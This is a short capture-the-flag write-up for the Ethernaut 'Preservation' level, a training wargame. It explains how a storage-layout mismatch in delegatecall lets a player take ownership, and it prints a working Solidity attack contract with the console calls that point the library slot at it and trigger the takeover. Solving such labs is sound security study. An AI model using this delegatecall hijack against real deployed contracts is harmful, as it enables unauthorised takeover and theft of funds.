# Level 16: [Preservation](https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC)

## Level objectives:
Claim ownership of contract.
## Analysis (lol)
- Only the constuctor sets the owner.
- When using `delegatecall`, the storage layout/order must be the same in the original as well as the delegate contract.
- The layout is not the same here.
- Calling the delegate contract, we can see that it modifies the `timeZone1Library`'s address.
- We can abuse this by setting it to the address of a contract we control.

## Steps:
- Attack contract:
```sol
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8;

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    // matching the original contract's storage layout.
    
    // fake function to match the func signature
    function setTime(uint _time) public {
        owner = 0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4;
    }
}
```
- Setting `timeZone1Library` to our contract's address:
```js
contract.setSecondTime("0x76e0704a9fAD5D0252e023B45b6c94BDcfD5d4A8");
```
- Triggering `delegatecall` to the first address:
```js
contract.setFirstTime("1674807193"); // put some value convertible to an actual number
```

- The contract thinks it's calling a function in the library contract whereas it's actually calling the `setTime` defined in our malicious contract.
- Verify attack using: `await contract.owner();`.